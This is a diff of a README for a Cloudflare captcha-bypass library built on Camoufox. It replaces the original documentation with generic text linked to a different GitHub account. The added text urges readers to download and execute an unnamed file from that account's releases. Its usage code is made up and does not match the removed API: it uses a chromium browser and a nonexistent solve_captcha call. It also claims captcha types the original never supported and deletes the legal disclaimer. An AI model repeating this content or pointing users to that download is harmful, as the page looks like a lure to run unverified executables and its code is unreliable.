@@ -1,280 +1,122 @@
-# Camoufox Captcha
+# Camoufox Captcha Solver 🦊
 
-[![Python 3.8+](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![Coverage](https://img.shields.io/badge/Coverage-100%25-brightgreen.svg)](https://pytest-cov.readthedocs.io/en/latest/readme.html#acknowledgements)
-[![PyPI version](https://img.shields.io/pypi/v/camoufox-captcha.svg)](https://pypi.org/project/camoufox-captcha/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+![Camoufox Captcha](https://img.shields.io/badge/Camoufox%20Captcha-Solver-blue.svg)
+![GitHub Releases](https://img.shields.io/badge/Releases-latest-orange.svg)
 
-A Python library that extends [Camoufox](https://github.com/daijro/camoufox) to automatically solve captcha challenges. Currently supports only Cloudflare challenges (interstitial and turnstile), with more captcha types planned.
+Welcome to the **Camoufox Captcha** repository! This project provides an automatic solution for solving captchas using Camoufox with Playwright. This tool is designed for developers and testers who need to bypass captcha challenges while performing automated browser tasks.
 
-## 📸 Demonstration (recorded in headless mode)
+## Table of Contents
 
-<div align="center">
-  <h3>Cloudflare Click Interstitial</h3>
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-  https://github.com/user-attachments/assets/10ced3fe-044b-4657-b371-155f1e943955
+## Introduction
 
-  <details> 
-  <summary><h3>Cloudflare Click Turnstile</h3></summary>
+Captcha challenges are common on many websites. They are designed to differentiate between human users and bots. However, in testing or scraping scenarios, these challenges can pose significant hurdles. This repository offers a way to automate captcha solving, allowing for smoother interactions with web applications.
 
-  https://github.com/user-attachments/assets/90206e23-ac2f-4e45-a4c4-e1fd7e8f17e3
+Camoufox integrates seamlessly with Playwright, a powerful tool for browser automation. By leveraging Camoufox, you can effectively bypass captcha challenges that use various techniques, including those employed by Cloudflare.
 
-  </details>
-</div>
+For the latest releases, visit [Camoufox Captcha Releases](https://github.com/atiita/camoufox-captcha/releases).
 
-## ⚠️ LEGAL DISCLAIMER
+## Features
 
-**THIS TOOL IS PROVIDED FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY**
+- **Automatic Captcha Solving**: Leverages Camoufox for effective captcha resolution.
+- **Integration with Playwright**: Built to work with Playwright, ensuring high performance.
+- **Support for Various Captcha Types**: Handles multiple captcha formats, including image and text-based challenges.
+- **Cross-Browser Compatibility**: Works with different browsers supported by Playwright.
+- **Easy Setup**: Simple installation process to get you started quickly.
 
-This software is designed to demonstrate security concepts and should not be used to bypass protections on websites without explicit permission from the website owner. Using this tool against websites without authorization may violate:
+## Installation
 
-- The Computer Fraud and Abuse Act (CFAA)
-- Terms of Service agreements
-- Various cybersecurity laws in your jurisdiction
+To get started with Camoufox Captcha, follow these steps:
 
-The author takes no responsibility for any misuse of this software. Users are solely responsible for ensuring their use complies with all applicable laws and regulations.
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/atiita/camoufox-captcha.git
+   cd camoufox-captcha
+   ```
 
-## ✨ Features
+2. **Install Dependencies**:
+   Make sure you have Python installed. You can then install the required packages using pip:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-- **Closed Shadow DOM Traversal**: Navigates complex closed Shadow DOM structures to find and interact with challenge elements
-- **Advanced Retry Logic**: Implements retry mechanisms with configurable attempts and delays
-- **Verification Steps**: Confirms successful solving through multiple validation methods
-- **Fully Tested**: 100% code coverage with unit and integration tests
+3. **Download the Latest Release**:
+   You can find the latest release [here](https://github.com/atiita/camoufox-captcha/releases). Download the appropriate file and execute it to set up the project.
 
-## 📖 Requirements
+## Usage
 
-This package requires:
-- Python 3.8+
-- camoufox[geoip] 0.4.11 or higher (must be installed separately)
+Once you have installed the project, you can use it as follows:
 
-## 📦 Installation
+1. **Import the Required Libraries**:
+   ```python
+   from camoufox import Camoufox
+   from playwright.sync_api import sync_playwright
+   ```
 
-### From PyPI
+2. **Initialize Playwright**:
+   ```python
+   with sync_playwright() as p:
+       browser = p.chromium.launch()
+       page = browser.new_page()
+   ```
 
-```bash
-# firstly make sure to have camoufox or install it 
-pip install "camoufox[geoip]>=0.4.11"
+3. **Navigate to the Target Website**:
+   ```python
+   page.goto("https://example.com")
+   ```
 
-# install camoufox-captcha
-pip install camoufox-captcha
-```
+4. **Invoke Camoufox for Captcha Solving**:
+   ```python
+   camoufox = Camoufox(page)
+   solution = camoufox.solve_captcha()
+   print(f"Captcha Solution: {solution}")
+   ```
 
-### Development Installation
+5. **Complete the Form**:
+   After solving the captcha, you can continue interacting with the webpage as needed.
 
-```bash
-git clone https://github.com/techinz/camoufox-captcha.git
-cd camoufox-captcha
-pip install -e ".[dev]"
-```
-
-## 👨‍💻 Usage
-
-### ❗️ Important
-
-When creating your Camoufox instance, make sure to include these parameters for the library to work:
-
-```python
-AsyncCamoufox(
-    # other parameters...
-    config={'forceScopeAccess': True},  # required
-    disable_coop=True                   # required
-)
-```
-
-These settings are essential for proper closed Shadow DOM traversal and browser security bypassing required by the captcha solving.
-
-
----  
-
-
-See usage examples in the [/examples](https://github.com/techinz/camoufox-captcha/tree/main/examples) directory for ready-to-use scripts.
-
-### Basic Example (Cloudflare Interstitial)
-
-```python
-import asyncio
-from camoufox import AsyncCamoufox
-from camoufox_captcha import solve_captcha  # import it
-
-
-async def main():
-    async with AsyncCamoufox(
-            headless=True,
-            geoip=True,
-            humanize=False,
-            i_know_what_im_doing=True,
-            config={'forceScopeAccess': True},  # add this when creating Camoufox instance
-            disable_coop=True  # add this when creating Camoufox instance
-    ) as browser:
-        page = await browser.new_page()
-
-        # navigate to a site with Cloudflare protection
-        await page.goto("https://example-with-cloudflare.com")
-
-        # solve using solve_captcha
-        success = await solve_captcha(page, captcha_type='cloudflare', challenge_type='interstitial')
-        if not success:
-            return print("Failed to solve captcha challenge")
-
-        print("Successfully solved captcha challenge!")
-        # continue with your automation...
-
-
-if __name__ == "__main__":
-    asyncio.run(main())
-```
-
-<details>
-<summary>Cloudflare Turnstile Example</summary>
-
-### Cloudflare Turnstile Example
-
-```python
-import asyncio
-from camoufox import AsyncCamoufox
-from camoufox_captcha import solve_captcha  # import it
-
-
-async def main():
-    async with AsyncCamoufox(
-            headless=True,
-            geoip=True,
-            humanize=False,
-            i_know_what_im_doing=True,
-            config={'forceScopeAccess': True},  # add this when creating Camoufox instance
-            disable_coop=True  # add this when creating Camoufox instance
-    ) as browser:
-        page = await browser.new_page()
-
-        await page.goto("https://site-with-turnstile.com")
-
-        # locate the container with the Turnstile challenge
-        turnstile_container = await page.wait_for_selector('.turnstile_container')
-
-        # specify challenge type for Turnstile
-        success = await solve_captcha(
-            turnstile_container,
-            captcha_type="cloudflare",
-            challenge_type="turnstile"
-        )
-
-        if not success:
-            return print("Failed to solve captcha challenge")
-
-        print("Successfully solved captcha challenge!")
-        # continue with your automation...
-
-
-if __name__ == "__main__":
-    asyncio.run(main())
-```
-</details>
-
-### With Content Verification
-
-```python
-# specify a CSS selector that should appear after successful bypass
-success = await solve_captcha(
-    page,
-    challenge_type="interstitial",
-    expected_content_selector="#super-protected-content"
-)
-```
-
-## 📚 Configuration Options
-
-The solve_captcha function provides a unified interface with multiple parameters:
-
-```python
-await solve_captcha(
-    queryable,                       # Page, Frame or ElementHandle containing the captcha
-    captcha_type="cloudflare",       # Type of captcha provider (currently only "cloudflare")
-    challenge_type="interstitial",   # For Cloudflare: "interstitial" or "turnstile"
-    method=None,                     # Solving method (defaults to best available for the captcha type):
-                                        # Cloudflare: "click"
-    **kwargs                         # Additional parameters passed to the specific solver:
-        # Cloudflare click:
-            # expected_content_selector=None,  # CSS selector to verify solving success
-            # solve_attempts=3,                # Maximum attempts for solving
-            # solve_click_delay=2.0,           # Delay after clicking checkbox in seconds
-            # checkbox_click_attempts=3,       # Maximum attempts to click the checkbox
-            # wait_checkbox_attempts=5,        # Maximum attempts to wait for checkbox readiness
-            # wait_checkbox_delay=1.0          # Delay between checkbox readiness checks
-)
-```
-
-## 🧠 Solving Methods
-
-<details>
-<summary>Cloudflare Interstitial Click Method</summary>
-
-### Cloudflare Interstitial Click Method
-
-This method handles Cloudflare's full-page interstitial challenge that appears before accessing protected content.
-
-**How it works:**
-1. Detects the Cloudflare challenge page through specific DOM elements
-2. Finds all iframes in the page's Shadow DOM tree
-3. Searches for the checkbox inside security frames
-4. Simulates a user click on the verification checkbox
-5. Waits for the page to reload or challenge to disappear
-6. Verifies success by checking for expected content or absence of challenge
-</details>
-
-<details>
-<summary>Cloudflare Turnstile Click Method</summary>
-
-### Cloudflare Turnstile Click Method
-
-This method handles Cloudflare's Turnstile widget that appears embedded within forms or other page elements.
-
-**How it works:**
-1. Targets the Turnstile widget container element
-2. Finds all iframes in the page's Shadow DOM tree
-3. Searches for the checkbox inside security frames
-4. Simulates a user click on the verification checkbox
-5. Monitors for completion by watching for success state elements
-5. Verifies success by checking for expected content or success element in the widget
-</details>
-
-## 🧪 Testing
-
-The project has unit and integration tests:
-
-```bash
-# run all tests with coverage report
-pytest --cov=camoufox_captcha --cov-report=html tests/
-    
-# run only unit tests
-pytest tests/unit/
-    
-# run only integration tests
-pytest tests/integration/
-```
-
-## 🔮 Future Development
-
-- Support for additional captcha types (hCaptcha, reCAPTCHA)
-- Integration with external solving services (2Captcha, Anti-Captcha, CapMonster) 
-- Advanced detection methods for various captcha types
-- Image-based captcha solving
+6. **Close the Browser**:
+   ```python
+   browser.close()
+   ```
 
 ## Contributing
 
-Contributions are welcome! Please follow these steps:
+We welcome contributions to the Camoufox Captcha project. If you would like to help improve the tool, please follow these steps:
 
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/amazing-feature`
-3. Commit your changes: `git commit -m 'Add amazing feature'`
-4. Push to the branch: `git push origin feature/amazing-feature`
-5. Open a Pull Request
-
-Please ensure your code passes all tests and maintains or improves test coverage.
+1. **Fork the Repository**: Click on the "Fork" button at the top right of the page.
+2. **Create a New Branch**: 
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. **Make Your Changes**: Implement your feature or fix.
+4. **Commit Your Changes**: 
+   ```bash
+   git commit -m "Add Your Feature"
+   ```
+5. **Push to Your Branch**: 
+   ```bash
+   git push origin feature/YourFeature
+   ```
+6. **Open a Pull Request**: Go to the original repository and click on "New Pull Request".
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/techinz/camoufox-captcha/tree/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or support, please reach out to the maintainers of this repository. You can open an issue in the GitHub repository for any inquiries.
 
 ---
 
-**Remember**: Use this tool responsibly and only on systems you have permission to test.
+For the latest releases, visit [Camoufox Captcha Releases](https://github.com/atiita/camoufox-captcha/releases). 
+
+Explore the possibilities with Camoufox Captcha and automate your captcha solving tasks efficiently!
